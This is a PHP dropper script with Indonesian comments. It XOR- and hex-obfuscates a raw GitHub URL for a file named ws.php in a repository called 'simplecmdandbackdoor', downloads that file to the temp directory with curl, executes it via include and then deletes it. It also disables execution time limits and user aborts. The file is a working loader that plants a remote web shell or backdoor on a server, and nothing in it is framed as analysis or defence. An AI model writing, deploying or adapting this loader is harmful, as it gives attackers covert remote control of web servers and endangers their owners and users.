<?php
ignore_user_abort(true);
set_time_limit(0);

// 🔹 **XOR Encoding & Decoding**
function xorEncryptDecrypt($data, $key) {
    $output = '';
    $keyLen = strlen($key);
    for ($i = 0, $len = strlen($data); $i < $len; $i++) {
        $xorChar = (ord($data[$i]) ^ ord($key[$i % $keyLen])) & 0x7F; // Hindari karakter non-printable
        $output .= chr($xorChar);
    }
    return $output;
}

function hexEncode($data) {
    return bin2hex($data);
}

function hexDecode($data) {
    return hex2bin($data);
}

function polyglotEncode($data, $key) {
    return hexEncode(xorEncryptDecrypt($data, $key));
}

function polyglotDecode($data, $key) {
    return xorEncryptDecrypt(hexDecode($data), $key);
}

// 🔹 **URL & Path Asli**
$originalURL  = "raw.githubusercontent.com"; 
$originalPath = "/Yucaerin/simplecmdandbackdoor/refs/heads/main/ws.php"; 

// 🔹 **Debug: URL Sebelum Encoding**
echo "<b>URL Asli:</b> $originalURL<br>";
echo "<b>Path Asli:</b> $originalPath<br>";

// 🔹 **Encoding**
$_ = "!";  // XOR Key
$encodedURL  = polyglotEncode($originalURL, $_);
$encodedPath = polyglotEncode($originalPath, $_);

// 🔹 **Debug: Hasil Encoding**
echo "<b>Encoded URL:</b> $encodedURL<br>";
echo "<b>Encoded Path:</b> $encodedPath<br>";

// 🔹 **Decoding**
$decodedURL  = polyglotDecode($encodedURL, $_);
$decodedPath = polyglotDecode($encodedPath, $_);

// 🔹 **Debug: Hasil Decoding**
echo "<b>Decoded URL:</b> $decodedURL<br>";
echo "<b>Decoded Path:</b> $decodedPath<br>";

// 🔹 **Validasi URL**
if (!preg_match('/^[a-zA-Z0-9.-]+$/', $decodedURL)) {
    die("Error: Hasil decoding URL tidak valid.");
}

// 🔹 **Cek Resolusi Host**
$resolvedIP = gethostbyname($decodedURL);
if ($resolvedIP === $decodedURL) {
    die("Error: Hostname tidak bisa di-resolve.");
}

// 🔹 **Download File**
$tempFile = sys_get_temp_dir() . '/downloaded_file.php';
$fullURL = "https://$decodedURL/$decodedPath";

// **Coba Unduh Manual**
echo "<br><a href=\"$fullURL\" target=\"_blank\">Coba buka URL ini</a><br>";

if (function_exists('curl_init')) {
    $ch = curl_init($fullURL);
    $fp = fopen($tempFile, 'wb');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    $success = curl_exec($ch);
    curl_close($ch);
    fclose($fp);
} else {
    $success = file_put_contents($tempFile, file_get_contents($fullURL));
}

// 🔹 **Eksekusi File Jika Berhasil**
if ($success && filesize($tempFile) > 0) {
    include $tempFile;
    unlink($tempFile);
} else {
    @unlink($tempFile);
    die("Download failed.");
}
?>
